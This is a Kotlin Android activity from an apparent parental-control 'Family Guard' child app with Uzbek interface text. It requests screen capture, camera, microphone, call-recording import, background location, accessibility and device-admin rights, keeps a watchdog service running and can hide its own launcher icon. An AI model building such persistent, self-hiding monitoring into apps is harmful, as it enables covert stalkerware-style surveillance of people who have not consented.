package com.example.parentalchild

import android.Manifest
import android.app.Activity
import android.app.AlarmManager
import android.app.admin.DevicePolicyManager
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.util.UUID
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private val deviceId by lazy {
        getPreferences(0).getString("deviceId", null)
            ?: UUID.randomUUID().toString().also {
                getPreferences(0).edit().putString("deviceId", it).apply()
            }
    }

    private lateinit var tvPairing: TextView
    private lateinit var tvStatus: TextView
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComp: android.content.ComponentName

    private val screenLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            startForegroundService(
                Intent(this, ScreenCaptureService::class.java)
                    .putExtra("resultCode", result.resultCode)
                    .putExtra("code", result.data)
                    .putExtra("deviceId", deviceId)
            )
            setStatus("✅ Screen capture ruxsati berildi")
        } else {
            setStatus("❌ Screen capture bekor qilindi")
        }
    }

    private val callRecordingPicker = registerForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri ->
        if (uri == null) { setStatus("⚠️ Audio fayl tanlanmadi"); return@registerForActivityResult }
        try {
            contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
        } catch (_: Exception) {}
        thread {
            val file = CallRecordingManager(this).importRecording(uri)
            runOnUiThread {
                if (file != null) setStatus("✅ Call recording saqlandi\nFayl: ${file.name}")
                else setStatus("❌ Audio faylni saqlab bo'lmadi")
            }
        }
    }

    private val camLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Kamera ruxsati berildi" else "❌ Kamera rad etildi") }

    private val micLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Mikrofon ruxsati berildi" else "❌ Mikrofon rad etildi") }

    private val notifLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Bildirishnoma ruxsati berildi" else "⚠️ Bildirishnoma rad etildi") }

    private val locLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val ok = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                 results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        if (ok && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            bgLocLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            setStatus(if (ok) "✅ Lokatsiya ruxsati berildi" else "❌ Lokatsiya rad etildi")
        }
    }

    private val bgLocLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Lokatsiya background ruxsati berildi" else "⚠️ Faqat ilova ochiq paytda") }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComp = android.content.ComponentName(this, DeviceAdminReceiver::class.java)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 40)
        }

        tvPairing = TextView(this).apply { textSize = 16f; text = "Ulanmoqda..." }
        tvStatus  = TextView(this).apply { textSize = 13f; setPadding(0, 8, 0, 24) }

        root.addView(tvPairing)
        root.addView(tvStatus)
        root.addView(makeBtn("📱 Screen capture ruxsati") { requestScreen() })
        root.addView(makeBtn("📷 Kamera ruxsati") { requestCamera() })
        root.addView(makeBtn("🎙️ Mikrofon ruxsati") { requestMicrophone() })
        root.addView(makeBtn("🔴 Audio yozishni boshlash") { startAudioRecording() })
        root.addView(makeBtn("⏹️ Audio yozishni to'xtatish") { stopAudioRecording() })
        root.addView(makeBtn("📞 Call recording import qilish") { importCallRecording() })
        root.addView(makeBtn("📍 Lokatsiya ruxsati") { requestLocation() })
        root.addView(makeBtn("🔔 Bildirishnoma ruxsati") { requestNotification() })
        root.addView(makeBtn("📊 Ilovalar statistikasi ruxsati") { requestUsageStats() })
        root.addView(makeBtn("♿ Accessibility ruxsati") { requestAccessibility() })
        root.addView(makeBtn("⚡ Batareya cheklovini olib tashlash") { requestBatteryOptimization() })
        root.addView(makeBtn("⏰ Aniq alarm ruxsati") { requestExactAlarm() })
        root.addView(makeBtn("🔐 Device Admin yoqish") { requestAdmin() })
        root.addView(makeBtn("👁️ Ikonkani yashirish") { hideAppIcon() })

        setContentView(root)

        // ✅ 1) Darhol heartbeat uchun serviceni ishga tushiramiz
        ContextCompat.startForegroundService(
            this,
            Intent(this, ScreenCaptureService::class.java)
                .putExtra("deviceId", deviceId)
        )

        // ✅ 2) Watchdog alarmni o'rnatamiz
        WatchdogReceiver.schedule(this)

        // ✅ 3) Pairing kodni ekranda ko'rsatamiz
        tvPairing.text = "Device ID: $deviceId\nServerga ulanmoqda..."
        thread {
            try {
                val api = Api(BuildConfig.API_URL, BuildConfig.DEVICE_SECRET)
                val code = api.register(deviceId, "Child device")
                runOnUiThread { tvPairing.text = "✅ Ulandi!\nPairing kod: $code" }
            } catch (e: Exception) {
                runOnUiThread { tvPairing.text = "❌ Ulanmadi: ${e.message}" }
            }
        }
    }

    private fun makeBtn(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        setOnClickListener { onClick() }
    }

    private fun setStatus(msg: String) {
        if (::tvStatus.isInitialized) tvStatus.text = msg
    }

    private fun importCallRecording() { callRecordingPicker.launch(arrayOf("audio/*")) }

    private fun requestAccessibility() {
        if (FamilyGuardAccessibilityService.isEnabled()) {
            setStatus("✅ Accessibility Service yoqilgan"); return
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun hideAppIcon() {
        try {
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            setStatus("✅ Ilova ikonkasi yashirildi")
        } catch (e: Exception) {
            setStatus("❌ Ikonkani yashirishda xatolik: ${e.message}")
        }
    }

    private fun requestScreen() {
        val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenLauncher.launch(manager.createScreenCaptureIntent())
    }

    private fun requestCamera() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
            setStatus("✅ Kamera ruxsati bor")
        else camLauncher.launch(Manifest.permission.CAMERA)
    }

    private fun requestMicrophone() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
            setStatus("✅ Mikrofon ruxsati bor")
        else micLauncher.launch(Manifest.permission.RECORD_AUDIO)
    }

    private fun startAudioRecording() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            micLauncher.launch(Manifest.permission.RECORD_AUDIO); return
        }
        try {
            ContextCompat.startForegroundService(this,
                Intent(this, AudioRecordingService::class.java).setAction(AudioRecordingService.ACTION_START))
            setStatus("🔴 Audio yozish boshlandi")
        } catch (_: Exception) { setStatus("❌ Audio yozishni boshlashda xatolik") }
    }

    private fun stopAudioRecording() {
        try {
            startService(Intent(this, AudioRecordingService::class.java).setAction(AudioRecordingService.ACTION_STOP))
            setStatus("⏹️ Audio yozish to'xtatildi")
        } catch (_: Exception) { setStatus("❌ Audio yozishni to'xtatishda xatolik") }
    }

    private fun requestNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            notifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
        else setStatus("✅ Bildirishnoma ruxsati kerak emas")
    }

    private fun requestLocation() {
        locLauncher.launch(arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        ))
    }

    private fun requestUsageStats() {
        if (AppHelper(this).hasUsagePermission()) setStatus("✅ Ilovalar statistikasi ruxsati bor")
        else startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            } catch (_: Exception) {
                startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
            }
        }
    }

    private fun requestExactAlarm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val am = getSystemService(AlarmManager::class.java)
            if (am.canScheduleExactAlarms()) setStatus("✅ Aniq alarm ruxsati bor")
            else startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                data = Uri.parse("package:$packageName")
            })
        }
    }

    private fun requestAdmin() {
        if (dpm.isAdminActive(adminComp)) { setStatus("✅ Device Admin yoqilgan"); return }
        startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Family Guard nazorat uchun.")
        })
    }
}
